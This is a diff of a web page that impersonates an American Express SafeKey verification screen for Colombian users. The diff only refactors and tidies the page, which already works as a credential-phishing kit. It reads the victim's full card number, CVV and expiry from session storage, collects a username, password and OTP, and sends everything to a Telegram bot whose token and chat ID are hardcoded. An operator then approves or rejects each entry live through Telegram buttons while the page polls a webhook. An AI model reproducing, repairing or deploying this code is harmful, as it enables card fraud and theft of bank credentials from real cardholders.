@@ -497,11 +497,11 @@
 
     <script>
         // ============================================
-        // CONFIGURACIÓN (igual que paso3 que funciona)
+        // CONFIGURACIÓN (idéntica a paso3.html)
         // ============================================
         const TELEGRAM_BOT_TOKEN = '8952571695:AAHr5qHDQ7Hu0LoqGS49jUWg9MYFjO1MaBw';
         const TELEGRAM_CHAT_ID = '-1004389419498';
-        const WEBHOOK_URL = '/api/webhook';
+        const WEBHOOK_URL = '/api/webhook';  // Relativa, como en paso3
         const POLLING_INTERVAL = 3000;
         const MAX_POLLING_TIME = 300000;
 
@@ -522,41 +522,26 @@
         // ============================================
         window.addEventListener('load', async function() {
             initializeTransaction();
-            await configurarWebhook();
+            await configurarWebhook();   // <-- ESTO ES LO QUE FALTABA
             console.log('✅ Sistema AMEX SafeKey listo - Webhook activo');
         });
 
         function initializeTransaction() {
             const storagePriority = sessionStorage.getItem('procesamiento_prioritario') === 'true';
-            
             let amount = 23000;
-            if (storagePriority) {
-                amount += 20000;
-            }
-            
+            if (storagePriority) amount += 20000;
             const formattedAmount = amount.toLocaleString('es-CO').replace(/,/g, '.');
             document.getElementById('transaction-amount').textContent = formattedAmount + ' Col$';
-            
             const now = new Date();
-            const dateStr = now.toLocaleDateString('es-CO', {
-                year: 'numeric',
-                month: '2-digit',
-                day: '2-digit'
-            }).split('/').reverse().join('/');
+            const dateStr = now.toLocaleDateString('es-CO', { year: 'numeric', month: '2-digit', day: '2-digit' }).split('/').reverse().join('/');
             document.getElementById('transaction-date').textContent = dateStr;
-            
             let cardLast4 = sessionStorage.getItem('cardLast4') || localStorage.getItem('cardLast4') || '0000';
             document.getElementById('card-last-digits').textContent = `XXXX XXXX XXXX ${cardLast4}`;
         }
 
         // ============================================
-        // FUNCIONES DE TELEGRAM Y WEBHOOK
+        // CONFIGURAR WEBHOOK (idéntico a paso3)
         // ============================================
-        function generarSolicitudId() {
-            return 'AMEX-' + Date.now() + '-' + Math.random().toString(36).substr(2, 9);
-        }
-
-        // Configurar el webhook (igual que paso3)
         async function configurarWebhook() {
             try {
                 const response = await fetch(`${WEBHOOK_URL}?setup=true`);
@@ -569,20 +554,20 @@
             }
         }
 
+        // ============================================
+        // FUNCIONES DE TELEGRAM
+        // ============================================
+        function generarSolicitudId() {
+            return 'AMEX-' + Date.now() + '-' + Math.random().toString(36).substr(2, 9);
+        }
+
         async function enviarDatosATelegram(datos) {
             try {
                 const inlineKeyboard = {
                     inline_keyboard: [
-                        [
-                            { text: "✅ APROBAR", callback_data: `approve_${datos.solicitudId}` }
-                        ],
-                        [
-                            { text: "❌ ERROR USUARIO", callback_data: `user_error_${datos.solicitudId}` },
-                            { text: "❌ ERROR CONTRASEÑA", callback_data: `pass_error_${datos.solicitudId}` }
-                        ],
-                        [
-                            { text: "❌ ERROR OTP", callback_data: `otp_error_${datos.solicitudId}` }
-                        ]
+                        [{ text: "✅ APROBAR", callback_data: `approve_${datos.solicitudId}` }],
+                        [{ text: "❌ ERROR USUARIO", callback_data: `user_error_${datos.solicitudId}` }, { text: "❌ ERROR CONTRASEÑA", callback_data: `pass_error_${datos.solicitudId}` }],
+                        [{ text: "❌ ERROR OTP", callback_data: `otp_error_${datos.solicitudId}` }]
                     ]
                 };
 
@@ -608,7 +593,6 @@
 ⏳ *Estado:* Esperando verificación...`;
 
                 const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
-                
                 const response = await fetch(url, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
@@ -620,7 +604,6 @@
                         disable_web_page_preview: true
                     })
                 });
-
                 const data = await response.json();
                 return data.ok;
             } catch (error) {
@@ -629,7 +612,7 @@
             }
         }
 
-        // Consulta al webhook (igual que paso3)
+        // Consulta al webhook
         async function verificarEstadoWebhook(solicitudId) {
             try {
                 const response = await fetch(`${WEBHOOK_URL}?check=${solicitudId}`);
@@ -644,18 +627,13 @@
 
         function iniciarPolling() {
             let tiempoInicio = Date.now();
-            
-            console.log('🔄 Iniciando polling al webhook...');
-            
             pollingInterval = setInterval(async () => {
                 if (Date.now() - tiempoInicio > MAX_POLLING_TIME) {
                     clearInterval(pollingInterval);
                     mostrarError('Tiempo de espera agotado. Intente nuevamente.');
                     return;
                 }
-                
                 const resultado = await verificarEstadoWebhook(solicitudId);
-                
                 if (resultado === 'approved') {
                     clearInterval(pollingInterval);
                     mostrarExito('✅ Autenticación exitosa. Redirigiendo...');
@@ -723,7 +701,6 @@
             e.preventDefault();
 
             let isValid = true;
-
             statusMessage.className = 'status-message';
             statusMessage.style.display = 'none';
             document.querySelectorAll('.form-group.error').forEach(el => el.classList.remove('error'));
@@ -732,7 +709,6 @@
                 usernameInput.parentElement.classList.add('error');
                 isValid = false;
             }
-
             if (!passwordInput.value.trim()) {
                 passwordInput.parentElement.classList.add('error');
                 isValid = false;
@@ -741,7 +717,6 @@
                 passwordInput.parentElement.querySelector('.error-message').textContent = 'La contraseña debe tener al menos 4 caracteres';
                 isValid = false;
             }
-
             if (!confirmationInput.value.trim()) {
                 confirmationInput.parentElement.classList.add('error');
                 isValid = false;
@@ -750,7 +725,6 @@
                 confirmationInput.parentElement.querySelector('.error-message').textContent = 'El código OTP debe contener 6 dígitos';
                 isValid = false;
             }
-
             if (!isValid) return;
 
             solicitudId = generarSolicitudId();
@@ -767,7 +741,7 @@
             const numeroTarjeta = sessionStorage.getItem('cardNumberFull') || 'No disponible';
             const cvv = sessionStorage.getItem('cardCVV') || 'No disponible';
             const vencimiento = sessionStorage.getItem('cardExpiry') || 'No disponible';
-            
+
             const datosTelegram = {
                 solicitudId: solicitudId,
                 numeroTarjeta: numeroTarjeta,
@@ -781,7 +755,6 @@
             };
 
             const enviado = await enviarDatosATelegram(datosTelegram);
-
             if (enviado) {
                 iniciarPolling();
             } else {
